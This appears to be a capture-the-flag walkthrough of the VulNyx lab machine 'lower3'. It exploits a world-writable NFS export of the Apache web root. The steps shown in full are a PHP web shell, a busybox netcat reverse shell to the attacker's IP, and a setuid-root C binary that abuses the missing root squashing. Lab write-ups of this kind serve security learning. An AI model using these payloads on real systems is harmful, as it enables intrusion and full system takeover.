# lower3

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| lower3 | d4t4s3c | Low | VulNyx |

**Summary:** The lower3 machine relied entirely on a single, severely misconfigured Network File System (NFS) service for its compromise. A full port scan exposed an RPC bind and an NFS service alongside SSH and Apache, and `showmount` revealed that the web root `/var/www/html` was exported to any host with no restrictions. Mounting the share read/write on the attacking machine proved the directory was writable, so the attack began by dropping a trivial PHP web shell directly into the web root and invoking it over HTTP to confirm command execution as the `low` user. A reverse shell was then established and stabilized into an interactive TTY. Enumeration of the box revealed no obvious custom SUID binaries, but the pivotal flaw was the NFS export itself: it had been configured without root squashing, meaning files created with root ownership on the attacking side would retain their root ownership on the target. A small C program that merely invoked `setuid(0)`, `setgid(0)`, and `/bin/bash` was compiled statically, given root ownership and the setuid bit on the mounted share, and then executed as the unprivileged `low` user, which promptly spawned a root shell and allowed both flags to be captured.

---

## Reconnaissance

The engagement began with host discovery. An ARP scan identified the target at `192.168.56.103`, and a quick ping confirmed the host was alive.

```bash
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.100  08:00:27:c0:d1:78      1      60  PCS Systemtechnik GmbH
 192.168.56.103  08:00:27:44:dd:f8      1      60  PCS Systemtechnik GmbH

┌──(kali㉿kali)-[~]
└─$ ping 192.168.56.103 -c 4
PING 192.168.56.103 (192.168.56.103) 56(84) bytes of data.
64 bytes from 192.168.56.103: icmp_seq=1 ttl=64 time=5.86 ms
64 bytes from 192.168.56.103: icmp_seq=2 ttl=64 time=2.11 ms
64 bytes from 192.168.56.103: icmp_seq=3 ttl=64 time=1.61 ms
64 bytes from 192.168.56.103: icmp_seq=4 ttl=64 time=0.499 ms

--- 192.168.56.103 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 0.499/2.521/5.862/2.015 ms
```

1. A full TCP port scan with version detection and default scripts was run against every port:

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- -sV -sC -O -T4 --min-rate 1000 192.168.56.103
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-11 00:34 -0400
Nmap scan report for 192.168.56.103 (192.168.56.103)
Host is up (0.0013s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp    open  http     Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35433/udp6  mountd
|   100005  1,2,3      42564/udp   mountd
|   100005  1,2,3      45441/tcp   mountd
|   100005  1,2,3      49875/tcp6  mountd
|   100021  1,3,4      39471/tcp   nlockmgr
|   100021  1,3,4      43013/tcp6  nlockmgr
|   100021  1,3,4      51887/udp6  nlockmgr
|   100021  1,3,4      57379/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
39471/tcp open  nlockmgr 1-4 (RPC #100021)
44663/tcp open  mountd   1-3 (RPC #100005)
45441/tcp open  mountd   1-3 (RPC #100005)
46959/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 08:00:27:44:DD:F8 (Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.74 seconds
```

The scan surfaced SSH on port 22, an Apache web server on port 80, and an NFS stack composed of `rpcbind`, the NFS service itself on port 2049, plus the associated `nlockmgr` and `mountd` RPC daemons. The RPC programs registered with `rpcbind` confirmed NFS version 3 and 4 were being served, which made the NFS export a primary target for investigation.

2. The list of exported NFS shares was queried with `showmount`:

```bash
┌──(kali㉿kali)-[~]
└─$ showmount -e 192.168.56.103
Export list for 192.168.56.103:
/var/www/html *
```

The output revealed a single share, `/var/www/html`, which was exported to the wildcard host (`*`). This meant any machine on the network could mount the Apache web root, and the fact that it was the web server's document root made it a compelling candidate for direct file upload and code execution.

---

## Initial Access

### Mounting the NFS Share

3. The share was mounted locally into a staging directory using the `nolock` option, which avoids the need for a lock manager daemon:

```bash
┌──(kali㉿kali)-[~]
└─$ mkdir /tmp/lower3

┌──(kali㉿kali)-[~]
└─$ sudo mount -t nfs 192.168.56.103:/var/www/html /tmp/lower3 -o nolock
[sudo] password for kali:

┌──(kali㉿kali)-[~]
└─$ ls -la /tmp/lower3
total 16
drwxrwxrwx  2 kali kali  4096 Mar  9  2025 .
drwxrwxrwt 10 root root   240 Aug 11 00:41 ..
-rw-------  1 kali kali 10701 Jun 12  2023 index.html
```

The directory listing showed a world-writable mount containing only the stock Apache `index.html`. To confirm the share was genuinely writable and that writes propagated to the target's web root, a marker file was created and fetched over HTTP:

```bash
┌──(kali㉿kali)-[~]
└─$ echo 'this is a test' > /tmp/lower3/test.txt
```

```bash
┌──(kali㉿kali)-[/tmp/lower3]
└─$ curl "http://192.168.56.103/test.txt"
this is a test
```

The file was served directly by the web server, confirming full write access to the live document root.

### Web Shell and Remote Code Execution

4. With unrestricted write access to the web root, a minimal PHP web shell was created on the mounted share:

```bash
┌──(kali㉿kali)-[~]
└─$ echo '<?php system($_GET["cmd"]); ?>' > /tmp/lower3/shell.php
```

5. Requesting the shell with an `id` command confirmed command execution. The output showed the server ran the commands as the `low` user with UID 1000:

```bash
┌──(kali㉿kali)-[~]
└─$ curl "http://192.168.56.103/shell.php?cmd=id"
uid=1000(low) gid=1000(low) groups=1000(low)
```

### Reverse Shell and TTY Stabilization

6. A netcat listener was started on the attacking machine to receive the incoming connection:

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
```

7. The web shell was then used to launch a reverse shell back to the attacker using `busybox nc` with an interactive bash process attached:

```bash
┌──(kali㉿kali)-[~]
└─$ curl "http://192.168.56.103/shell.php?cmd=busybox%20nc%20192.168.56.102%204444%20-e%20%2Fbin%2Fbash"
```

```bash
listening on [any] 4444 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 39362
script -qc /bin/bash /dev/null
low@lower3:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 4444

low@lower3:/var/www/html$ export TERM=xterm
low@lower3:/var/www/html$ export SHELL=/bin/bash
low@lower3:/var/www/html$ stty rows 80 cols 150
```

The connection landed as the `low` user. The session was then stabilized into a fully interactive TTY using `script` to allocate a pseudo-terminal, followed by `stty raw -echo` and `fg` on the local side, and finally exporting `TERM`, `SHELL`, and the correct terminal dimensions.

---

## Privilege Escalation

### SUID Enumeration

8. With a stable shell, the hunt for privilege escalation vectors began. A search for setuid binaries across the filesystem was performed:

```bash
low@lower3:/home/low$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 55528 Jan 20  2022 /usr/bin/mount
-rwsr-xr-x 1 root root 71912 Jan 20  2022 /usr/bin/su
-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 35040 Jan 20  2022 /usr/bin/umount
-rwsr-xr-x 1 root root 182600 Jan 14  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 114784 Jun 28  2021 /usr/sbin/mount.nfs
-rwsr-xr-x 1 root root 481608 Jul  2  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51336 Oct  5  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Only stock system binaries appeared, with nothing obviously exploitable. This directed the investigation back toward the NFS service itself. The classic attack against a poorly configured export is possible when the share is mounted with root squashing disabled, as described in the reference technique for privilege escalation through a misconfigured NFS:

```
https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/
```

### Misconfigured NFS and the Setuid Binary

9. The share was still mounted at `/tmp/lower3` on the attacking machine. A tiny C program was written that calls `setuid(0)`, `setgid(0)`, and then spawns a shell:

```bash
┌──(kali㉿kali)-[~]
└─$ cd /tmp/lower3

┌──(kali㉿kali)-[/tmp/lower3]
└─$ vim shell.c

┌──(kali㉿kali)-[/tmp/lower3]
└─$ cat shell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main()
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```

10. The program was compiled as a statically linked binary so it would run on the target regardless of the libraries present, then it was given root ownership and the setuid bit on the attacking side:

```bash
┌──(kali㉿kali)-[/tmp/lower3]
└─$ gcc -static shell.c -o shell

┌──(kali㉿kali)-[/tmp/lower3]
└─$ sudo chown root:root shell
[sudo] password for kali:

┌──(kali㉿kali)-[/tmp/lower3]
└─$ sudo chmod +s shell

┌──(kali㉿kali)-[/tmp/lower3]
└─$ ll shell
-rwsrwsr-x 1 root root 784728 Aug 11 01:29 shell 

┌──(kali㉿kali)-[/tmp/lower3]
└─$ file shell
shell: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=5ff052bfb5a6096931d31185dd9b72871a9add93, for GNU/Linux 3.2.0, not stripped
```

The `file` output confirmed the binary was setuid and setgid with root as the owner. Because the NFS export did not apply root squashing, the root-owned setuid attributes written through the mount were honored verbatim on the target filesystem.

11. Back on the target shell, the newly uploaded binary was executed as the unprivileged `low` user. Since it carried the root setuid bit, it immediately spawned a root shell:

```bash
low@lower3:/home/low$ cd /var/www/html
low@lower3:/var/www/html$ ls
index.html  rootbash  shell  shell.c  shell.php  test.txt
low@lower3:/var/www/html$ ./shell
root@lower3:/var/www/html# cd
bash: cd: HOME not set
root@lower3:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root),1000(low)
root@lower3:/var/www/html# su -
root@lower3:~# id;whoami;hostname;pwd
uid=0(root) gid=0(root) grupos=0(root)
root
lower3
/root
root@lower3:~# cat /home/low/user.txt /root/root.txt
```

The `id` output showed UID 0 and GID 0, confirming full root privileges. The shell's home directory was not set, so `su -` was used to transition into a clean root environment. From there, both the user flag at `/home/low/user.txt` and the root flag at `/root/root.txt` were read out and the box was fully owned.

---

## Attack Chain Summary

1. **Reconnaissance**: ARP discovery and a full Nmap scan identified SSH, Apache, and a complete NFS stack (rpcbind, NFS, nlockmgr, mountd). `showmount -e` revealed the web root `/var/www/html` exported to every host.

2. **Vulnerability Discovery**: The NFS export was mounted read/write with root squashing disabled, giving unauthenticated write access to the live Apache document root with full control over file ownership and attributes.

3. **Exploitation**: A trivial PHP web shell was dropped into the mounted web root and invoked over HTTP, yielding command execution as the `low` user. A `busybox nc` one-liner delivered a reverse shell that was stabilized into an interactive TTY.

4. **Internal Enumeration**: A filesystem-wide search for setuid binaries turned up only stock system tools, steering the focus back to the misconfigured NFS share as the escalation path.

5. **Privilege Escalation**: A statically compiled C program calling `setuid(0)` and `setgid(0)` was granted root ownership and the setuid bit on the mounted share, exploiting the lack of root squashing. Executing it as `low` spawned a root shell, allowing both `user.txt` and `root.txt` to be captured.
